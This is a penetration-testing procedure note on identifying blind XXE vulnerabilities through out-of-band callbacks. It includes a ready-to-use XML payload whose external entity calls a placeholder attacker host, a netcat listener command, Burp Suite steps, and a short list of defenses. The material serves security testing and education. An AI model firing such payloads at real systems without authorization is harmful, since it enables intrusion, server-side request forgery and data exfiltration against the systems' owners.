---
type: procedure
verified: true
submitted: true
tactics:
  - '[[Reconnaissance]]'
techniques:
  - '[[Vulnerability Scanning]]'
sub_techniques: []
tags:
  - injection
  - owasp
  - owasp-top-10
  - web-applications
  - xxe
commands:
  - '[[commands/netcat-windows-listen-on-port]]'
tools:
  - '[[tools/Burp-Suite]]'
platforms:
  - Web
skill_level: intermediate
impact_level: high
detection_risk: medium
validated: true
---

# Identify-Blind-XXE-Using-Out-of-Band-Interaction

## Summary

This procedure demonstrates how to identify blind XML External Entity (XXE) vulnerabilities in web applications by crafting payloads that trigger out-of-band (OOB) interactions. In blind XXE, the application does not reflect the injected entities in its response, but success is confirmed when the server makes an external request to an attacker-controlled endpoint, such as a listener on the attacker's machine.

## Description

Blind XXE occurs when an application parses untrusted XML input without proper entity resolution restrictions, allowing attackers to define external entities that reference attacker-controlled resources. Unlike in-band XXE, where data is exfiltrated directly in the response, OOB XXE relies on the server initiating a side-channel connection (e.g., HTTP, DNS, or TCP) to confirm vulnerability exploitation. This technique is commonly tested against login forms or XML-based APIs. The target environment is typically a web application processing XML POST requests, such as authentication endpoints. Prerequisites include network access to intercept traffic and a controlled server for receiving callbacks. Expected outcomes include confirmation of XXE via incoming connections, potentially leading to further data exfiltration or server-side request forgery (SSRF).

## Requirements

1. Access to a web proxy like [[tools/Burp-Suite]] for intercepting and modifying HTTP requests.
2. A Windows machine with Netcat (nc.exe) installed for setting up the OOB listener.
3. Network connectivity allowing the target server to reach the attacker's listener IP and port.
4. Basic knowledge of XML structure and entity injection.
5. The target application must accept XML payloads, such as in login or upload forms.

## Defense

Defensive measures and detection strategies:

- Disable external entity processing in XML parsers (e.g., set `FEATURE_SECURE_PROCESSING` to true in Java).
- Use web application firewalls (WAFs) to block XML payloads containing external entity declarations like `<!ENTITY % ext SYSTEM "http://...">`.
- Implement input validation to reject or sanitize XML inputs, preferring JSON or other safer formats.
- Monitor outbound network traffic for unexpected connections to unknown IPs/ports, using tools like Suricata or network IDS.
- Enable logging of XML parsing errors and review for entity expansion attempts.

## Objectives

1. Confirm the presence of a blind XXE vulnerability by triggering an OOB callback.
2. Establish a baseline for the target's XML processing behavior.
3. Gather evidence of successful entity resolution without relying on in-response data.
4. Expected outcome: Incoming connection to the attacker's listener, indicating XXE exploitation.

## Instructions

### Step 1: Intercept and Baseline the XML Request

**Context**: Use Burp Suite to capture a legitimate XML-based request (e.g., login form) and verify normal behavior. This establishes a baseline response and identifies the XML structure for payload injection.

Intercept the request using Burp Proxy, forward it to Repeater, and submit it unmodified.

**Expected Output**: Successful login or processing response (e.g., HTTP 200 with authentication message), confirming the endpoint accepts XML without errors.

### Step 2: Craft and Inject the XXE Payload

**Context**: Modify the XML to include an external parameter entity that references an attacker-controlled URL. When parsed, the server will attempt to fetch this URL, confirming XXE via OOB.

In Burp Repeater, edit the XML body to insert the XXE declaration. For example, in a login payload:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE login [
<!ENTITY % ext SYSTEM "http://$_ATTACKER_IP:$_PORT/xxe">
%ext;
]>
<login>
<username>victim</username>
<password>pass</password>
</login>
```

Replace `$_ATTACKER_IP` and `$_PORT` with your listener details. Submit the modified request.

**Expected Output**: No change in the application response (blind nature), but monitor the listener for the callback.

### Step 3: Set Up the Out-of-Band Listener

**Context**: Start a TCP listener on the attacker's machine to capture the incoming connection initiated by the server's entity resolution. This confirms the XXE without in-band reflection.

Execute [[commands/netcat-windows-listen-on-port]] to start listening:

```cmd
nc.exe -nlvp $_PORT
```

**Expected Output**: Listener starts with message like "listening on [any] $_PORT ...". Upon payload submission, an incoming connection appears, potentially with GET request to /xxe.

### Step 4: Submit Payload and Verify Callback

**Context**: Resubmit the crafted XXE payload and check the listener for evidence of exploitation. The absence of errors in the app response combined with the callback indicates success.

Submit the request from Step 2 while the listener is active. Observe the netcat output for the connection.

**Expected Output**: Netcat receives a connection from the target server's IP, confirming the external entity fetch.

**Success Indicators**:
- Incoming TCP connection to the listener port from the target's IP.
- No HTTP errors or blocks in Burp; payload accepted silently.
